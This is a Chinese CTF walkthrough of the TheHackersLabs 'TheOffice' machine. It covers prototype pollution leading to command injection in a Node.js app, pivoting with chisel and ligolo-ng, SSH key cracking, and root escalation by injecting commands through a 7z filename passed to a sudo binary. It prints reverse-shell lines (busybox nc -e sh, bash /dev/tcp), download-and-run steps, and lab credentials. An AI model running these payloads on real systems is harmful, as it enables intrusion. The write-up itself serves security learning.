# thehackerlabs Theoffice

地址：https://thehackerslabs.com/theoffice/

这个靶场在theoffice算是比较有意思的了，这里学了一下有关linux内网穿透的工具[ligolo-ng](https://gitcode.com/gh_mirrors/li/ligolo-ng/overview)

### IP段扫描：

└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:82:4b:c5, IPv4: 192.168.56.120
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:10       (Unknown: locally administered)
192.168.56.100  08:00:27:73:d7:77       PCS Systemtechnik GmbH
192.168.56.136  08:00:27:a1:81:4b       PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.340 seconds (109.40 hosts/sec). 3 responded

### 端口扫描：

```
└─# nmap -sC -sV -p- 192.168.56.136                                                                                                                                                                   
Starting Nmap 7.92 ( https://nmap.org ) at 2024-12-06 09:00 EST                                                                                                                                       
Nmap scan report for theoffice.thl (192.168.56.136)                                                                                                                                                   
Host is up (0.0040s latency).                                                                                                                                                                         
Not shown: 65533 closed tcp ports (reset)                                                                                                                                                             
PORT   STATE SERVICE VERSION                                                                                                                                                                          
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)                                                                                                                                    
| ssh-hostkey:                                                                                                                                                                                        
|   256 37:6f:ef:bf:06:d7:7e:4d:15:0f:96:09:df:b3:fb:de (ECDSA)                                                                                                                                       
|_  256 0c:24:fb:41:09:de:f1:5e:1e:57:83:b4:d5:71:d2:35 (ED25519)                                                                                                                                     
80/tcp open  http    Node.js Express framework                                                                                                                                                        
|_http-title: The Office Website                                                                                                                                                                      
MAC Address: 08:00:27:A1:81:4B (Oracle VirtualBox virtual NIC)                                                                                                                                        
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                               
                                                                                                                                                                                                      
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                        
Nmap done: 1 IP address (1 host up) scanned in 68.34 seconds
```

### 目录扫描：

![image-20241206220156447](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206220156447.png)

看到这个目录，我当时就很有记忆，原因是之前打过一个靶机也是这个目录，利用的是原型污染漏洞（https://www.freebuf.com/articles/web/375485.html）具体可以看我给地址的描述

![image-20241206220501187](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206220501187.png)

登录上去是这个界面，下面有一行提示是账号密码的，当时我还是看了一下页面详细

![image-20241206220608024](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206220608024.png)

存在页面注释

```
<!--
credentials = ['{"username":"admin", "password": "' + crypto.randomBytes(64).toString("hex") + '", "cookie": "' + crypto.randomBytes(64).toString("hex") + '", "isAdmin":true}',
'{"username":"guest", "password":"guest", "cookie": "' + crypto.randomBytes(64).toString("hex") + '"}'];
-->
```

![image-20241206220737193](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206220737193.png)

拿账号密码登录出现，不是admin用户登录

![image-20241206220821369](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206220821369.png)先测试原型污染

![image-20241206220919265](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206220919265.png)

提示是有这个原型污染漏洞

![image-20241206220947056](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206220947056.png)

回到界面可以看到提示我们存在过程

![image-20241206221033463](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206221033463.png)

到这里就可以进行命令注入了

![image-20241206221222806](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206221222806.png)

这里自己是有busybox的

![image-20241206221250156](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206221250156.png)

sh就反弹回来了，我试过/bin/bash，失败了

### 提权：

```
ls                                                                                                                                                                                                    
css                                                                                                                                                                                                   
htmls                                                                                                                                                                                                 
node_modules                                                                                                                                                                                          
package-lock.json                                                                                                                                                                                     
package.json                                                                                                                                                                                          
routes.js                                                                                                                                                                                             
server.js 
```

这给目录都是网站的一下配置，往前看

```
ls -al                                                                                                                                                                                                
total 28                                                                                                                                                                                              
drwxr-sr-x    1 node     node          4096 May 13  2024 .                                                                                                                                            
drwxr-xr-x    1 root     root          4096 May  2  2024 ..                                                                                                                                           
-rw-------    1 node     node           590 May 13  2024 .ash_history                                                                                                                                 
-rw-r--r--    1 node     node            31 May  7  2024 .ftp                                                                                                                                         
drwxr-sr-x    4 node     node          4096 May  6  2024 .npm                                                                                                                                         
drwxr-sr-x    1 node     node          4096 May  6  2024 app
```

这里有一个.ftp和.ash_history

```
cat .ftp                                                                                                                                                                                              
carlton:gQzq2tG7sFxTm5XadrNfHR 
```

```
cat .ash_history                                                                                                                                                                                      
cd ..                                                                                                                                                                                                 
ls                                                                                                                                                                                                    
wget http://10.0.2.5/agent                                                                                                                                                                            
chmod +x agent                                                                                                                                                                                        
cat .ftp                                                                                                                                                                                              
./agent -connect 10.0.2.5:11601 -ignore-cert                                                                                                                                                          
cd ..                                                                                                                                                                                                 
cd app/                                                                                                                                                                                               
busybox nc 10.0.2.5 8888 sh                                                                                                                                                                           
busybox nc 10.0.2.5 8888 -e sh                                                                                                                                                                        
ls                                                                                                                                                                                                    
export TERM=xter                                                                                                                                                                                      
reset                                                                                                                                                                                                 
export TERM=xterm                                                                                                                                                                                     
reset                                                                                                                                                                                                 
ip a                                                                                                                                                                                                  
export TERM=xterm                                                                                                                                                                                     
reset                                                                                                                                                                                                 
ls                                                                                                                                                                                                    
cd ..                                                                                                                                                                                                 
wget http://10.0.2.5/agent                                                                                                                                                                            
ls                                                                                                                                                                                                    
./agent -connect 10.0.2.5:11601 -ignore-cert                                                                                                                                                          
ls -la ~                                                                                                                                                                                              
cat .ftp                                                                                                                                                                                              
./agent -connect 10.0.2.5:11601 -ignore-cert                                                                                                                                                          
cd ..                                                                                                                                                                                                 
cd /tmp                                                                                                                                                                                               
ls                                                                                                                                                                                                    
busybox nc 10.0.2.5 8888 -e sh                                                                                                                                                                        
ls                                                                                                                                                                                                    
export TERM=xterm                                                                                                                                                                                     
reset                                                                                                                                                                                                 
wget http://10.0.2.5/agent                                                                                                                                                                            
chmod +x agent                                                                                                                                                                                        
./agent                                                                                                                                                                                               
./agent -h                                                                                                                                                                                            
file agent                                                                                                                                                                                            
ls                                                                                                                                                                                                    
cd ..                                                                                                                                                                                                 
ls                                                                                                                                                                                                    
./agent                                                                                                                                                                                               
rm agent                                                                                                                                                                                              
ls                                                                                                                                                                                                    
exit 
```

我们可以通过这里看到这是一个代理本地的一个操作，接下来就需要自己做一个代理去扫描端口

```
ip a                                                                                                                                                                                                  
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN qlen 1000                                                                                                                         
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                                                                                                             
    inet 127.0.0.1/8 scope host lo                                                                                                                                                                    
       valid_lft forever preferred_lft forever                                                                                                                                                        
    inet6 ::1/128 scope host                                                                                                                                                                          
       valid_lft forever preferred_lft forever                                                                                                                                                        
11: eth0@if12:  mtu 1500 qdisc noqueue state UP                                                                                                               
    link/ether 02:42:ac:65:00:02 brd ff:ff:ff:ff:ff:ff                                                                                                                                                
    inet 172.101.0.2/28 brd 172.101.0.15 scope global eth0                                                                                                                                            
       valid_lft forever preferred_lft forever 
```

这是网段，这里172.101.0.2/28可以了解到他是一个映射出来的网络而且这个网络没有21端口，原先我们的靶机地址也没有这个21端口，所以我们需要利用工具去扫描拿到这个21端口网络，这里需要利用内网穿透的方式获取。

![image-20241206215144314](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206215144314.png)

![image-20241206215228855](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206215228855.png)

这是我根据wp使用的方法，据ll104567大佬的推荐使用chisel这个工具也可以完成操作

在tmp目录下有下载好的agent

```
cd /tmp                                                                                                                                                                                               
ls -al                                                                                                                                                                                                
total 4580                                                                                                                                                                                            
drwxrwxrwt    1 root     root          4096 May  9  2024 .                                                                                                                                            
drwxr-xr-x    1 root     root          4096 May  7  2024 ..                                                                                                                                           
-rwxr-xr-x    1 node     node       4681728 May  9  2024 agent 
```

我们把需要的chisel共具上传

```
wget 192.168.56.120/chisel                                                                                                                                                                            
ls -al                                                                                                                                                                                                
total 13320                                                                                                                                                                                           
drwxrwxrwt    1 root     root          4096 Dec  6 14:21 .                                                                                                                                            
drwxr-xr-x    1 root     root          4096 May  7  2024 ..                                                                                                                                           
-rwxr-xr-x    1 node     node       4681728 May  9  2024 agent                                                                                                                                        
-rw-r--r--    1 node     node       8945816 Dec  6 14:21 chisel                                                                                                                                       
chmod +x chisel
```

```
└─# tldr chisel                                                                                                                                                                                       
Warning: The cache hasn't been updated for 82 days.                                                                                                                                                   
You should probably run `tldr --update` soon.                                                                                                                                                         
                                                                                                                                                                                                      
  Create TCP/UDP tunnels, transported over HTTP, secured via SSH.                                                                                                                                     
  Includes both client and server in the same `chisel` executable.                                                                                                                                    
  More information: .                                                                                                                                             
                                                                                                                                                                                                      
  Run a Chisel server:                                                                                                                                                                                
                                                                                                                                                                                                      
      chisel server                                                                                                                                                                                   
                                                                                                                                                                                                      
  Run a Chisel server listening to a specific port:                                                                                                                                                   
                                                                                                                                                                                                      
      chisel server -p server_port                                                                                                                                                                    
                                                                                                                                                                                                      
  Run a chisel server that accepts authenticated connections using username and password:                                                                                                             
                                                                                                                                                                                                      
      chisel server --auth username:password                                                                                                                                                          
                                                                                                                                                                                                      
  Connect to a Chisel server and tunnel a specific port to a remote server and port:                                                                                                                  
                                                                                                                                                                                                      
      chisel client server_ip:server_port local_port:remote_server:remote_port                                                                                                                        
                                                                                                                                                                                                      
  Connect to a Chisel server and tunnel a specific host and port to a remote server and port:                                                                                                         
                                                                                                                                                                                                      
      chisel client server_ip:server_port local_host:local_port:remote_server:remote_port                                                                                                             
                                                                                                                                                                                                      
  Connect to a Chisel server using username and password authentication:                                                                                                                              
                                                                                                                                                                                                      
      chisel client --auth username:password server_ip:server_port local_port:remote_server:remote_port                                                                                               
                                                                                                                                                                                                      
  Initialize a Chisel server in reverse mode on a specific port, also enabling SOCKS5 proxy (on port 1080) functionality:                                                                             
                                                                                                                                                                                                      
      chisel server -p server_port --reverse --socks5                                                                                                                                                 
                                                                                                                                                                                                      
  Connect to a Chisel server at specific IP and port, creating a reverse tunnel mapped to a local SOCKS proxy:                                                                                        
                                                                                                                                                                                                      
      chisel client server_ip:server_port R:socks
```

这里是关于chisel的使用手册

![image-20241206234432265](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206234432265.png)

![image-20241206234443913](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206234443913.png)

![image-20241206234418752](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206234418752.png)

现在等扫描端口，这里花了很长时间才成功ping通，但是没有出现端口还是不能保证这个隧道搭建成功。

![image-20241206235304026](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206235304026.png)

等了很多时间却不见端口，现在却只有ping 通

![image-20241206235909960](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241206235909960.png)

不行，选择使用搁置大法，先把下面用wp的方法做了

![image-20241207000705438](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241207000705438.png)

换成ligolo方法很快就把端口扫出来，因为之前看有ftp，我们直接找到上面的ftp端口ip进行连接

```
└─# ftp 172.101.0.3                                                                                                                                                                                   
Connected to 172.101.0.3.                                                                                                                                                                             
220 Welcome to my FTP server.                                                                                                                                                                         
Name (172.101.0.3:kali): carlton                                                                                                                                                                      
331 Please specify the password.                                                                                                                                                                      
Password:                                                                                                                                                                                             
230 Login successful.                                                                                                                                                                                 
Remote system type is UNIX.                                                                                                                                                                           
Using binary mode to transfer files.                                                                                                                                                                  
ftp> ls                                                                                                                                                                                               
229 Entering Extended Passive Mode (|||30001|)                                                                                                                                                        
150 Here comes the directory listing.                                                                                                                                                                 
a-rw-r--r--    1 1000     1000         3434 May 06  2024 id_rsa                                                                                                                                       
226 Directory send OK.                                                                                                                                                                                
ftp> 
```

这里有id_rsa

```
└─# chmod 600 id_rsa                                                                                                                                                                                  
                                                                                                                                                                                                      
┌──(root㉿kali)-[/home/kali]                                                                                                                                                                          
└─# ssh2john id_rsa > tmp                                                                                                                                                                             
                                                                                                                                                                                                      
┌──(root㉿kali)-[/home/kali]                                                                                                                                                                          
└─# john tmp --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                                                              
Using default input encoding: UTF-8                                                                                                                                                                   
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])                                                                                                                              
No password hashes left to crack (see FAQ)                                                                                                                                                            
                                                                                                                                                                                                      
┌──(root㉿kali)-[/home/kali]                                                                                                                                                                          
└─# john tmp --show                                                                                                                                                                                   
id_rsa:lawrence                                                                                                                                                                                       
                                                                                                                                                                                                      
1 password hash cracked, 0 left
```

我们拿到id密码看看是什么用户

```
└─# ssh-keygen -y -f id_rsa                                                                                                                                                                           
Enter passphrase:                                                                                                                                                                                     
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCwuuL05wU+OumOZ4c1qkTnYKMZ07vnULAqo19mIoY9TdeVBx4vgN8f7pHV7e3sCmXMQff8942XiOnLxuNFDGzLAY+2Ua8vRuDL/a+NmYSlJP3Q4o80orG4wdiHvDvtKfwPKjjFw4oQ8dBWUYyRzEY4zyrxY9bVix
mt5PtSnddfxrzgY4xgDg7W3vS5Tv3Fno6l/fmH6XOEhVuN+xVcj8dSCbkzjpyJ3AlEDL+8k2vLUn7AMJG9v57UzRIB75QksRQ7N4dw+BphW+Fo0KbOGPBHYEzW1DehqUYRfHWiDUpUsKtpSQVACHm/plYXd7HcXy8PVbU24KAtR6Zw0LeUHqTJs19ghguhXKUYUjkW
gdRz9YudlRDS2+VBT3J5KsGEZSHf2AeuuVDCN63K9mp6O80lBnPAN2/miyCmu+ClsCkpxDPicp3T/gmbXjBTKyIAJ7RDe6XIsY5KuMLmR7erXVIA9WajuF4SSKMpoiyjWk3sE3PORLBKyik5PVZ6VLtqciKYdHmgFRb1HL+L/e6iHdNz4TZnuEi2+Kf4D9D9CZx/be
KojjeYwmKMTFEinzsiXPlvXWmu4LmIrOglYvqWxEzon7KEV4EzDzwijqOIfEfvC9sm2js6f0JbPygQbEh0WkC6uMrkyiNbHHFdMbuGNQt82sFR2/kPlZ/QKyHT14wgkw== willsmith@server
```

这里有了用户名

我们拿去上面扫出来的22 ip端口一个一个试

```
└─# ssh willsmith@172.101.0.11 -i id_rsa                                                                                                                                                              
Enter passphrase for key 'id_rsa':                                                                                                                                                                    
Linux office 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64                                                                                                                
                                                                                                                                                                                                      
The programs included with the Debian GNU/Linux system are free software;                                                                                                                             
the exact distribution terms for each program are described in the                                                                                                                                    
individual files in /usr/share/doc/*/copyright.                                                                                                                                                       
                                                                                                                                                                                                      
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                                                                                                                     
permitted by applicable law.                                                                                                                                                                          
Last login: Wed May  8 21:48:44 2024 from 172.101.0.2                                                                                                                                                 
willsmith@office:~$   
```

这个用户获取了ssh权限

![image-20241207001326388](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241207001326388.png)

我把这个程序拿出来ida看了一下

![image-20241207001354247](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241207001354247.png)

这个伪代码有说名7z结尾的前面会被带进system(),这里是我的个人理解，不对的话当我没说

目录下还有一个文件是.bash_history

```
willsmith@office:~$ cat .bash_history                                                                                                                                                                 
ls -la                                                                                                                                                                                                
cat user.txt                                                                                                                                                                                          
cat .ftp                                                                                                                                                                                              
sudo -l                                                                                                                                                                                               
echo 'test' > test.txt                                                                                                                                                                                
7zz a test.7z test.txt                                                                                                                                                                                
clear                                                                                                                                                                                                 
cp test.7z '’whoami’'.7z                                                                                                                                                                              
ls                                                                                                                                                                                                    
rm *.7z                                                                                                                                                                                               
ls                                                                                                                                                                                                    
7zz a test.7z test.txt                                                                                                                                                                                
'`whoami`'                                                                                                                                                                                            
cp test.7z '`whoami`'.7z                                                                                                                                                                              
ls                                                                                                                                                                                                    
sudo /opt/uncompress /home/willsmith/'`whoami`'.7z                                                                                                                                                    
touch shell.sh                                                                                                                                                                                        
cp test.7z '`bash shell.sh`'.7z                                                                                                                                                                       
nano shell.sh                                                                                                                                                                                         
vi shell.sh                                                                                                                                                                                           
echo '#!/bin/bash;bash -i >& /dev/tcp/10.0.2.5/9000 0>&1' > shell.sh                                                                                                                                  
sudo /opt/uncompress /home/willsmith/'`bash shell.sh`'.7z                                                                                                                                             
pwd                                                                                                                                                                                                   
ls                                                                                                                                                                                                    
rm shell.sh                                                                                                                                                                                           
wget http://10.0.2.5/shell.sh                                                                                                                                                                         
curl http://10.0.2.5/shell.sh -o shell.sh                                                                                                                                                             
sudo /opt/uncompress /home/willsmith/'`bash shell.sh`'.7z 
```

这里说明了这个使用sudo 的操作

也就是7z一个文件’`这里是命令`‘，他可以这样执行命令

![image-20241207002048980](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241207002048980.png)

模仿上面写命令

```
willsmith@office:~$ sudo /opt/uncompress '`bash revse.sh`.7z'                                                                                                                                         
`bash revse.sh`.7z is a valid 7z file.                                                                                                                                                                
                                                                                                                                                                                                      
7-Zip (z) 22.01 (x64) : Copyright (c) 1999-2022 Igor Pavlov : 2022-07-15                                                                                                                              
 64-bit locale=C.UTF-8 Threads:1                                                                                                                                                                      
                                                                                                                                                                                                      
Scanning the drive for archives:                                                                                                                                                                      
                                                                                                                                                                                                      
ERROR: errno=2 : No such file or directory                                                                                                                                                            
.7z                                                                                                                                                                                                   
                                                                                                                                                                                                      
                                                                                                                                                                                                      
                                                                                                                                                                                                      
System ERROR:                                                                                                                                                                                         
errno=2 : No such file or directory  
```

失败了一下

![image-20241207002234995](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241207002234995.png)

这里我测试了很多实验发现出现那个错误是前面加了#!/bin/bash;

![image-20241207002328696](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241207002328696.png)

好了完成操作

```
root@office:~# ls -al                                                                                                                                                                                 
ls -al                                                                                                                                                                                                
total 28                                                                                                                                                                                              
drwx------ 1 root root 4096 May  8  2024 .                                                                                                                                                            
drwxr-xr-x 1 root root 4096 May  7  2024 ..                                                                                                                                                           
-rw------- 1 root root   33 May  8  2024 .bash_history                                                                                                                                                
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc                                                                                                                                                      
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile                                                                                                                                                     
drwx------ 2 root root 4096 May  6  2024 .ssh                                                                                                                                                         
-rw-r--r-- 1 root root   28 May  7  2024 office.thl                                                                                                                                                   
root@office:~# 
```

这里出现了一个office.thl

```
root@office:~# cat office.thl                                                                                                                                                                         
cat office.thl                                                                                                                                                                                        
office:P4mDjcVfqrj7eEXBV7EX
```

还是账号密码拿去进行22端口登录

![image-20241207002503913](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241207002503913.png)

经过测试这个登录是靶机的

![image-20241207002537152](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241207002537152.png)

好了到这里靶机的提权就完了

```
root@TheOffice:/home/office# ls -al                                                                                                                                                                   
total 52                                                                                                                                                                                              
drwx------ 6 office office  4096 may  7  2024 .                                                                                                                                                       
drwxr-xr-x 3 root   root    4096 may  6  2024 ..                                                                                                                                                      
drwxr-xr-x 4 office office  4096 may  7  2024 app                                                                                                                                                     
-rw-r--r-- 1 root   root   15699 may  6  2024 app.tgz                                                                                                                                                 
lrwxrwxrwx 1 root   root       9 may  6  2024 .bash_history -> /dev/null                                                                                                                              
-rw-r--r-- 1 office office   220 may  6  2024 .bash_logout                                                                                                                                            
-rw-r--r-- 1 office office  3526 may  6  2024 .bashrc                                                                                                                                                 
drwxr-xr-x 2 root   root    4096 may  7  2024 ftp                                                                                                                                                     
drwxr-xr-x 2 root   root    4096 may  6  2024 laptop                                                                                                                                                  
-rw-r--r-- 1 office office   807 may  6  2024 .profile                                                                                                                                                
drwxr-xr-x 2 root   root    4096 may  7  2024 server                                                                                                                                                  
-rw-r--r-- 1 office office     0 may  6  2024 .sudo_as_admin_successful                                                                                                                               
root@TheOffice:/home/office# cd                                                                                                                                                                       
root@TheOffice:~# ls a-l                                                                                                                                                                              
ls: no se puede acceder a 'a-l'^[[A: No existe el fichero o el directorio                                                                                                                             
root@TheOffice:~# ls -al                                                                                                                                                                              
total 36                                                                                                                                                                                              
drwx------  5 root root 4096 may  6  2024 .                                                                                                                                                           
drwxr-xr-x 18 root root 4096 may  5  2024 ..                                                                                                                                                          
lrwxrwxrwx  1 root root    9 may  6  2024 .bash_history -> /dev/null                                                                                                                                  
-rw-r--r--  1 root root  571 abr 10  2021 .bashrc                                                                                                                                                     
drwx------  3 root root 4096 may  6  2024 .docker                                                                                                                                                     
-rw-------  1 root root   20 may  6  2024 .lesshst                                                                                                                                                    
drwxr-xr-x  3 root root 4096 may  6  2024 .local                                                                                                                                                      
-rw-r--r--  1 root root  161 jul  9  2019 .profile                                                                                                                                                    
-r--------  1 root root   39 may  6  2024 root.txt                                                                                                                                                    
drwx------  2 root root 4096 may  5  2024 .ssh                                                                                                                                                        
root@TheOffice:~# cat root.txt                                                                                                                                                                        
flag{f73a64a82b4dbeaf43f308999c5b380f}                                                                                                                                                                
root@TheOffice:~#   
```

但是没有发现user.txt

![image-20241207002713772](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241207002713772.png)

发现在这里

![image-20241207002751668](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241207002751668.png)

当然其他方法也能找到

![image-20241207002906511](C:\Users\LingMj\AppData\Roaming\Typora\typora-user-images\image-20241207002906511.png)

9分到手





学习链接：http://www.vxer.cn/2024/11/21/thehackerslabs-theoffice-walkthrough/

https://blog.csdn.net/qq_53343022/article/details/143091544

https://www.freebuf.com/articles/web/375485.html